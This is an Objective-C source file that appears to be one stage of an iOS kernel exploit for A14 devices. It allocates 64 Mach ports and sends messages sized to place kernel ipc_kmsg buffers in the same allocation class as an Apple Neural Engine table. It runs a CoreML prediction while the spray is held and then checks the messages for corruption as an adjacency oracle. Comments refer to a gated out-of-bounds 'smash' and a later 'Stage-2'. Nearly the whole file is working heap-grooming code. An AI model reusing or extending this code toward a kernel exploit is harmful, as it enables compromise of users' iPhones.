#import "P034Kmsg3072Occupancy.h"
#import "P033CoreML1in1out.h"
#import "LabLocalTime.h"

#import <fcntl.h>
#import <mach/mach.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

/*
 * Shape O occupancy — A14 23F77 ipc_kmsg (shapeO_ipc_kmsg_allocator_kdata_VALID).
 *
 * Simple mach_msg (no OOL), allocator flags=1:
 *   kdata_size = msgh_size + 0x24
 * ANE table view = 0x820 → same DATA band (0x801..0xc00] needs:
 *   msgh_size ∈ [0x7dd, 0xbdc]
 * Exact class match with ANE 0x820:
 *   msgh_size = 0x7fc  →  kdata = 0x820
 *
 * Prior build used msgh_size=0xc00 → kdata=0xc24 (OVER 0xc00 → likely 4096).
 * That does NOT neighbor the 0x820 table. Fixed here.
 *
 * Occupancy only. n=2 CoreML. No ProgramSendRequest. No 254. No n>0x80 OOB.
 */
#define P034_BUILD @"p034-kmsg3072-occupancy-v2"
#define P034_MSG_SIZE 0x7FCu   /* → kdata 0x820 */
#define P034_KDATA_SIZE (P034_MSG_SIZE + 0x24u)
#define P034_N 64

static NSMutableString *p034_buf;
static int p034_fd = -1;

static void p034_log(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([NSString class]) {
        if (p034_buf)
            [p034_buf appendString:out];
        if (p034_fd >= 0) {
            const char *s = out.UTF8String;
            if (s)
                write(p034_fd, s, strlen(s));
        }
    }
}

@implementation P034Kmsg3072Occupancy

+ (NSString *)tap {
    p034_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p034_kmsg3072_occupancy_log.txt"];
    p034_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p034_log(@"=== p034 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P034_BUILD);
    p034_log(@"Shape O occupancy: hold %u simple msgs msgh_size=0x%x → kdata=0x%x (ANE class).",
             P034_N, P034_MSG_SIZE, P034_KDATA_SIZE);
    p034_log(@"RE: kdata=msgh_size+0x24; band [0x801,0xc00]; prior 0xc00→0xc24 was WRONG class.");
    p034_log(@"Does NOT send 254 buffers. Does NOT ProgramSendRequest. n=2 CoreML only.");

    _Static_assert(P034_KDATA_SIZE == 0x820, "kdata must match ANE table view size");
    _Static_assert(P034_MSG_SIZE >= 0x7dd && P034_MSG_SIZE <= 0xbdc, "msg size outside 3072 band");

    mach_port_t ports[P034_N];
    memset(ports, 0, sizeof(ports));
    uint32_t nalloc = 0;
    for (uint32_t i = 0; i < P034_N; i++) {
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        if (kr != KERN_SUCCESS) {
            p034_log(@"port alloc[%u] kr=0x%x — stopping spray", i, kr);
            break;
        }
        kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            p034_log(@"insert_right[%u] kr=0x%x", i, kr);
            mach_port_deallocate(mach_task_self(), p);
            break;
        }
        ports[i] = p;
        nalloc++;
    }
    p034_log(@"ports allocated=%u", nalloc);

    uint32_t nsent = 0;
    for (uint32_t i = 0; i < nalloc; i++) {
        uint8_t buf[P034_MSG_SIZE];
        /* Distinct marker: "P034" + index + 0xA5 fill — easier adjacency oracle later */
        memset(buf, 0xA5, sizeof(buf));
        memcpy(buf + sizeof(mach_msg_header_t), "P034", 4);
        uint32_t tag = i ^ 0x50303400u;
        memcpy(buf + sizeof(mach_msg_header_t) + 4, &tag, 4);

        mach_msg_header_t *h = (mach_msg_header_t *)buf;
        h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        h->msgh_size = P034_MSG_SIZE;
        h->msgh_remote_port = ports[i];
        h->msgh_local_port = MACH_PORT_NULL;
        h->msgh_voucher_port = MACH_PORT_NULL;
        h->msgh_id = 0x50303400 | (int)i;
        mach_msg_return_t mr = mach_msg(h, MACH_SEND_MSG, P034_MSG_SIZE, 0,
                                        MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (mr != MACH_MSG_SUCCESS) {
            p034_log(@"send[%u] mr=0x%x", i, mr);
            break;
        }
        nsent++;
    }
    p034_log(@"sent=%u held; expected kdata=0x%x (same class as ANE 0x820)", nsent, P034_KDATA_SIZE);

    p034_log(@"--- CoreML 1-in/1-out while spray held ---");
    NSString *pred = [P033CoreML1in1out predictOnce];
    if (pred.length)
        p034_log(@"%@", pred);
    else
        p034_log(@"predictOnce returned empty");

    uint32_t nrecv = 0, nmatch = 0, ncorrupt = 0;
    for (uint32_t i = 0; i < nsent; i++) {
        uint8_t rbuf[P034_MSG_SIZE + 64];
        memset(rbuf, 0, sizeof(rbuf));
        mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
        mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG, 0, sizeof(rbuf),
                                        ports[i], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (mr != MACH_MSG_SUCCESS) {
            p034_log(@"recv[%u] mr=0x%x", i, mr);
            continue;
        }
        nrecv++;
        uint8_t *body = rbuf + sizeof(mach_msg_header_t);
        uint32_t expect_tag = i ^ 0x50303400u;
        int ok = (memcmp(body, "P034", 4) == 0 && memcmp(body + 4, &expect_tag, 4) == 0);
        if (i < 3 || i == nsent - 1) {
            p034_log(@"recv[%u] first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %s",
                     i, body[0], body[1], body[2], body[3], body[4], body[5], body[6], body[7],
                     body[8], body[9], body[10], body[11], body[12], body[13], body[14], body[15],
                     ok ? "OK" : "MUT");
        }
        if (ok)
            nmatch++;
        else
            ncorrupt++;
    }
    p034_log(@"recv=%u markerOK=%u mutated=%u", nrecv, nmatch, ncorrupt);
    p034_log(@"mutated!=0 with n=2 is spray/CoreML interference, not 43748 OOB.");
    p034_log(@"Adjacency oracle (n>=0xc0 smash) stays gated until Stage-2 named or explicit opt-in.");
    p034_log(@"Do not fire 254 here. Occupancy proof only — correct 0x820 class.");

    for (uint32_t i = 0; i < nalloc; i++) {
        if (ports[i])
            mach_port_destroy(mach_task_self(), ports[i]);
    }

    if (p034_fd >= 0) {
        fcntl(p034_fd, F_FULLFSYNC);
        close(p034_fd);
        p034_fd = -1;
    }
    return p034_buf ?: @"";
}

@end
